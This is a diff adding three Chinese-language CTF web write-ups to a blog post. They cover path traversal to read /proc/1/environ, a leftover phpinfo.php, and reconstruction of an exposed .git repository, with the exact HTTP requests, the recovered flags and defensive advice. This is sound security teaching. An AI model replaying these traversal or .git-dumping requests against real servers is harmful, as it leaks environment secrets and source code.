@@ -2,10 +2,11 @@
 title: CTF-WEB
 date: 2026-05-07 20:54:18
 categories:
-  - 学习
-  - CTF
+  - 网络安全
 tags:
-  - 简单知识
+  - CTF
+  - Web安全
+  - Burp Suite
 sticky: 1
 ---
 
@@ -3516,4 +3517,499 @@ str_replace 非递归替换，可通过双写嵌套绕过
 ```text
 str_replace('../', '') 可用 ....// 绕过
 双写嵌套：中间的 ../ 被删后两端重新拼合成 ../
+```
+
+# 路径穿越读取 /proc/1/environ 泄露环境变量 FLAG
+
+---
+
+## 题目类型
+
+- 路径穿越（Path Traversal）
+- Linux /proc 伪文件系统
+- 环境变量信息泄露
+- Docker 容器敏感数据暴露
+
+---
+
+## 题目现象
+
+访问题目页面后，看到一个"内部运维平台 · 文件浏览"页面，展示了 `/app/` 目录下的文件列表：
+
+```text
+/app/app.log      1.3K
+/app/error.log    824B
+/app/config.json  2.1K
+/app/env.sample   512B
+/app/flag.txt     128B
+/app/README.md    3.4K
+/app/cache/       96B
+```
+
+页面说明该服务正在下线，文件均为只读历史数据。HTML 中表格的 CSS 类名为 `fake-table`，所有 URL 路径均返回同一静态页面。
+
+---
+
+## 核心漏洞
+
+- Web 服务器将 URL 路径直接映射到文件系统路径，未对 `../` 做过滤
+- 使用多层 `../` 可从 Web 根目录逐级向上穿越至系统根目录
+- Linux 的 `/proc/1/environ` 文件记录了 PID 1（容器主进程）的全部环境变量
+- FLAG 以环境变量形式注入容器，而非存储在普通文件中
+
+---
+
+## 解题思路
+
+1. **观察现象，确认路由机制**
+
+   所有 URL 请求（包括 `/app/flag.txt`、`/?file=...` 等）均返回同一 HTML 页面，说明服务器将所有请求路由到同一脚本，但 **URL 路径本身会被映射到文件系统**。
+
+2. **构造路径穿越 payload**
+
+   Web 服务器的文档根目录通常是 `/var/www/html` 等多级路径，使用 8 层以上 `../` 可确保穿越到文件系统根目录 `/`。
+
+   目标文件：`/proc/1/environ`
+
+   构造 URL：
+
+   ```text
+   GET /../../../../../../../../proc/1/environ HTTP/1.1
+   ```
+
+3. **通过 Burp Suite Repeater 发送请求**
+
+   在 Burp Suite 中新建请求，直接在 URL 路径处输入穿越路径：
+
+   ```http
+   GET /../../../../../../../../proc/1/environ HTTP/1.1
+   Host: docker.qingcen.net:47981
+   Connection: close
+   ```
+
+4. **获取环境变量内容**
+
+   服务器返回 `Content-Type: application/octet-stream`，响应体为 `/proc/1/environ` 的原始内容（以 `\0` 分隔各环境变量），其中包含：
+
+   ```text
+   PWD=/app
+   FLAG=flag{bf1b550a-8f4c-44ef-9ed9-8c80559340be}
+   ```
+
+---
+
+## 最终请求
+
+```http
+GET /../../../../../../../../proc/1/environ HTTP/1.1
+Host: docker.qingcen.net:47981
+Connection: close
+```
+
+---
+
+## 最终结果
+
+```text
+flag{bf1b550a-8f4c-44ef-9ed9-8c80559340be}
+```
+
+---
+
+## 答疑
+
+### Q1：为什么直接访问 `/app/flag.txt` 无法获取 flag？
+
+A：flag 并不存储在 `/app/flag.txt` 文件里，页面展示的文件列表是"伪造"的（`fake-table`），只是迷惑视线。真正的 flag 以环境变量形式注入到容器进程中。
+
+### Q2：`/proc/1/environ` 是什么？
+
+A：Linux 的 `/proc` 是一个虚拟文件系统，记录了内核和进程的实时信息。`/proc/1/environ` 是 PID 1（容器主进程）启动时的环境变量，以 null 字节（`\0`）分隔每个变量，格式为 `KEY=VALUE\0KEY=VALUE\0...`。
+
+### Q3：为什么要用 8 层 `../`？
+
+A：从 Web 服务器文档根目录（通常深度为 3～4 级，如 `/var/www/html`）穿越到根目录 `/` 只需 3～4 层 `../`，使用 8 层可以确保无论实际目录深度如何都能到达根目录，因为到达根目录后多余的 `../` 不再继续向上。
+
+### Q4：为什么不需要任何参数或 Cookie 就能成功？
+
+A：路径穿越漏洞利用的是 URL 路径本身，服务器在处理路径映射时没有对 `../` 做规范化或过滤，导致可以访问文档根目录以外的任意文件。
+
+### Q5：真实环境中如何防御？
+
+A：
+- 对 URL 路径做规范化处理（如 `realpath()`），拒绝包含 `../` 的路径
+- 使用 Web 服务器配置限制文档根目录外的访问（如 nginx 的 `root` 指令配合 `alias`）
+- 不将敏感信息（如 flag、密钥）直接放入环境变量，或限制 `/proc` 的访问权限
+
+---
+
+## 总结
+
+本题本质：
+
+```text
+服务器对 URL 路径未做 ../ 过滤，导致路径穿越；
+flag 以环境变量形式存储在容器进程中，通过读取 /proc/1/environ 获取。
+```
+
+利用方式：
+
+```text
+GET /../../../../../../../../proc/1/environ
+```
+
+漏洞类型：
+
+```text
+路径穿越（Path Traversal）+ 环境变量信息泄露
+```
+
+核心记忆：
+
+```text
+多层 ../ 穿越到根目录；
+/proc/1/environ 记录容器主进程的所有环境变量，常包含注入的 FLAG。
+```
+
+# phpinfo 敏感信息泄露 / 环境变量暴露题
+
+---
+
+## 题目类型
+
+- phpinfo() 信息泄露
+- 环境变量暴露
+- 敏感文件未授权访问
+- nginx + php-fpm 架构
+
+---
+
+## 题目现象
+
+访问题目页面，看到一个"内部应用状态面板"，显示以下信息：
+
+```text
+Service:  php-fpm / nginx-proxy
+Endpoint: /
+Mode:     readonly · diagnostics
+```
+
+页面日志区域显示：
+
+```text
+[diag] environment snapshot available <internal only>
+[diag] runtime config synced from env · overrides applied
+```
+
+两条日志明确暗示 flag 存储在**环境变量**中，并以"仅内部可见"提示存在泄露风险。
+
+---
+
+## 核心漏洞
+
+- 服务器在生产目录下遗留了 `phpinfo.php` 文件
+- `phpinfo()` 会完整输出 PHP 环境信息，包括服务器环境变量（`$_ENV`、`$_SERVER`）
+- FLAG 以环境变量形式注入到 php-fpm 进程，通过 phpinfo 可直接读取
+
+---
+
+## 解题思路
+
+1. **读取页面日志提示**
+
+   页面日志说明 flag 在环境变量中（`environment snapshot available <internal only>`），同时服务类型为 `php-fpm / nginx-proxy`，PHP 相关文件可能直接可访问。
+
+2. **尝试访问 phpinfo.php**
+
+   直接在浏览器或 Burp Suite 中访问：
+
+   ```http
+   GET /phpinfo.php HTTP/1.1
+   Host: docker.qingcen.net:31665
+   ```
+
+   服务器返回完整的 phpinfo 输出页面（约 75KB）。
+
+3. **在 phpinfo 输出中搜索 FLAG**
+
+   phpinfo 页面中的 **Environment** 区块列出了所有环境变量，其中可见：
+
+   ```text
+   FLAG    flag{5d147839-5208-481d-b365-8a2bc6ccc096}
+   ```
+
+   `$_ENV` 区块同样显示：
+
+   ```text
+   $_ENV['FLAG']    flag{5d147839-5208-481d-b365-8a2bc6ccc096}
+   ```
+
+---
+
+## 最终请求
+
+```http
+GET /phpinfo.php HTTP/1.1
+Host: docker.qingcen.net:31665
+```
+
+---
+
+## 最终结果
+
+```text
+flag{5d147839-5208-481d-b365-8a2bc6ccc096}
+```
+
+---
+
+## 答疑
+
+### Q1：phpinfo() 会暴露哪些敏感信息？
+
+A：phpinfo() 输出内容非常全面，常见的敏感信息包括：
+
+| 类别 | 内容 |
+|------|------|
+| 环境变量 | `$_ENV`、`$_SERVER` 中的所有键值，包括 FLAG、密钥、数据库密码等 |
+| PHP 配置 | `disable_functions`、`open_basedir`、文件路径等 |
+| 服务器信息 | 操作系统、内核版本、Web 服务器类型及版本 |
+| 路径信息 | 文档根目录、PHP 安装路径 |
+| 已加载扩展 | 所有已启用的 PHP 扩展及版本 |
+
+### Q2：为什么 phpinfo 能读到 php-fpm 的环境变量？
+
+A：在 nginx + php-fpm 架构中，nginx 将 PHP 请求通过 FastCGI 协议转发给 php-fpm 进程处理。FLAG 环境变量在启动 php-fpm 时注入到其进程环境中，phpinfo() 直接读取当前 PHP 进程（即 php-fpm worker）的环境，因此可以看到 FLAG。
+
+### Q3：`/proc/1/environ` 路径穿越为什么在这题不可用？
+
+A：本题的 nginx 配置对路径做了规范化处理，`../` 序列被过滤或不被映射到文件系统，因此路径穿越无法读取 `/proc` 文件。但 phpinfo.php 文件直接可访问，提供了另一条获取环境变量的路径。
+
+### Q4：如何防止 phpinfo 泄露？
+
+A：
+- 删除或重命名生产环境中的 `phpinfo.php`、`info.php` 等诊断文件
+- 使用 nginx/Apache 的 `deny all` 规则屏蔽对诊断文件的外部访问
+- 不将密钥、FLAG 等敏感信息直接放入环境变量，或使用 secret manager 管理
+
+---
+
+## 总结
+
+本题本质：
+
+```text
+生产环境遗留了 phpinfo.php 文件，
+phpinfo() 输出暴露了 php-fpm 进程的全部环境变量，
+其中包含以环境变量形式注入的 FLAG。
+```
+
+利用方式：
+
+```text
+直接访问 /phpinfo.php，在 Environment 区块搜索 FLAG。
+```
+
+漏洞类型：
+
+```text
+phpinfo 敏感信息泄露 / 诊断文件未删除
+```
+
+核心记忆：
+
+```text
+phpinfo() 暴露 $_ENV 全部环境变量；
+生产环境不应保留 phpinfo.php；
+日志中的 "environment snapshot available" 是直接提示。
+```
+
+---
+
+# Git 目录泄露恢复源码读取 flag.txt
+
+---
+
+## 题目类型
+
+Git 目录泄露（`.git` 目录暴露）
+
+---
+
+## 题目现象
+
+页面打开后显示一个黑色背景的烟花动画页面（"点击夜空欣赏烟花"），内容来自第三方 CDN，看似是无关的装饰页。响应头显示 `X-Powered-By: PHP/8.2.30`，服务器确实运行 PHP。
+
+直接访问 `/source.php`、`/flag.php`、`/phpinfo.php` 等路径均返回与首页相同的烟花页面（12158 字节）——这些路径不存在。但访问 `/.git/HEAD` 时返回 23 字节的 `application/octet-stream` 内容，说明 `.git` 目录被公开暴露。
+
+---
+
+## 核心漏洞
+
+- `.git` 目录意外放置在 Web 根目录下并可被直接访问
+- 攻击者可以按照 Git 对象存储协议，逐一下载 `.git/refs/heads/master`、commit 对象、tree 对象、blob 对象，从而完整重建整个仓库内容
+- 仓库中包含 `flag.txt` 文件，其内容即为 FLAG
+
+---
+
+## 解题思路
+
+1. **发现 `.git` 目录可访问**
+
+   扫描常见敏感路径，`  ` 返回 23 字节文本（不是页面），确认 Git 目录泄露：
+
+   ```http
+   GET /.git/HEAD HTTP/1.1
+   Host: docker.qingcen.net:40373
+   ```
+
+   响应：
+   ```text
+   ref: refs/heads/master
+   ```
+
+2. **获取 master 分支的 commit hash**
+
+   ```http
+   GET /.git/refs/heads/master HTTP/1.1
+   Host: docker.qingcen.net:40373
+   ```
+
+   响应：
+   ```text
+   72b4553df7b5b2c582ba6533d00829c14574391e
+   ```
+
+3. **读取 commit 对象**
+
+   Git 对象存储路径为 `.git/objects/<前2位>/<后38位>`，内容为 zlib 压缩：
+
+   ```http
+   GET /.git/objects/72/b4553df7b5b2c582ba6533d00829c14574391e HTTP/1.1
+   Host: docker.qingcen.net:40373
+   ```
+
+   解压后获得 commit 内容，从中提取 tree hash：
+   ```text
+   tree 068d53fc48546129ad5b9c970a9cbbe5d7dbbe53
+   author CTF User <ctf@example.com>
+   Add files including flag.txt
+   ```
+
+4. **读取 tree 对象，列出所有文件**
+
+   ```http
+   GET /.git/objects/06/8d53fc48546129ad5b9c970a9cbbe5d7dbbe53 HTTP/1.1
+   Host: docker.qingcen.net:40373
+   ```
+
+   解压 tree 对象后得到文件列表：
+   ```text
+   100644  flag.txt   → blob c280f2cc671259f8c1354c9b3fbf2f5a7c6ae3d4
+   100755  index.html → blob 112386e9fdf6ca7a9329854471cf423ea39b3e79
+   ```
+
+5. **读取 flag.txt 的 blob 对象**
+
+   ```http
+   GET /.git/objects/c2/80f2cc671259f8c1354c9b3fbf2f5a7c6ae3d4 HTTP/1.1
+   Host: docker.qingcen.net:40373
+   ```
+
+   解压后内容：
+   ```text
+   flag{6514a78f-8bca-4a6c-9ad5-02376060cf79}
+   ```
+
+---
+
+## 最终请求
+
+```http
+GET /.git/objects/c2/80f2cc671259f8c1354c9b3fbf2f5a7c6ae3d4 HTTP/1.1
+Host: docker.qingcen.net:40373
+```
+
+（通过 `.git/HEAD` → `.git/refs/heads/master` → commit 对象 → tree 对象 → blob 对象逐层推导）
+
+---
+
+## 最终结果
+
+```text
+flag{6514a78f-8bca-4a6c-9ad5-02376060cf79}
+```
+
+---
+
+## 答疑
+
+### Q1：Git 对象是什么格式？
+
+A：Git 所有对象（commit、tree、blob、tag）统一存储在 `.git/objects/` 目录下，以 SHA-1 哈希值命名，内容为 `zlib.compress("type size\0content")`。具体：
+
+| 对象类型 | 用途 |
+|----------|------|
+| commit | 存储提交信息、tree 引用、作者、时间 |
+| tree | 存储目录结构，包含子文件/目录的 mode、name、SHA |
+| blob | 存储文件内容 |
+| tag | 存储带注释的标签 |
+
+### Q2：`.git` 目录通常在哪里暴露？
+
+A：当 Web 应用把整个项目（包括 `.git/`）部署到 Web 根目录，且 nginx/Apache 没有设置 `deny all` 屏蔽 `.git` 时，`.git/` 就会被公开访问。常见于：
+- 直接 `git clone` 后在原目录起 Web 服务
+- Docker 镜像 COPY 时未排除 `.git/`（`.dockerignore` 缺失或不完整）
+- 部署脚本使用 `rsync`、`scp` 时未排除 `.git/`
+
+### Q3：如何防止 `.git` 目录泄露？
+
+A：
+- **Nginx**：在 server 配置中添加 `location ~ /\.git { deny all; return 404; }`
+- **Apache**：`.htaccess` 中添加 `RedirectMatch 404 /\.git`
+- **Docker**：在 `.dockerignore` 中添加 `.git/`，COPY 时不包含 git 历史
+- **CI/CD**：发布流水线只部署构建产物，不包含源码目录
+
+### Q4：有没有自动化工具来利用 Git 目录泄露？
+
+A：有，常用工具包括：
+- **GitHack**（`lijiejie/GitHack`）：自动爬取 `.git` 目录并重建文件
+- **git-dumper**：通过爬取 `.git/` 完整恢复仓库
+- **Dirsearch + 手工**：发现泄露后手工按对象链遍历
+
+---
+
+## 总结
+
+本题本质：
+
+```text
+.git 目录暴露在 Web 根目录，
+攻击者通过读取 HEAD → refs → commit → tree → blob 对象链，
+无需任何凭据即可恢复完整仓库内容，
+仓库中的 flag.txt 直接包含 FLAG。
+```
+
+利用方式：
+
+```text
+GET /.git/HEAD 确认泄露
+→ GET /.git/refs/heads/master 获取 commit hash
+→ GET /.git/objects/<hash> 逐层解压 commit/tree/blob
+→ 读取 flag.txt blob 内容
+```
+
+漏洞类型：
+
+```text
+Git 目录泄露 / 敏感目录未屏蔽
+```
+
+核心记忆：
+
+```text
+.git/HEAD 可访问 = 整个仓库可重建；
+Git 对象：zlib 解压后格式为 "type size\0content"；
+commit → tree → blob，三步定位任意文件内容；
+防御：nginx deny all 屏蔽 /.git，或 .dockerignore 排除。
 ```
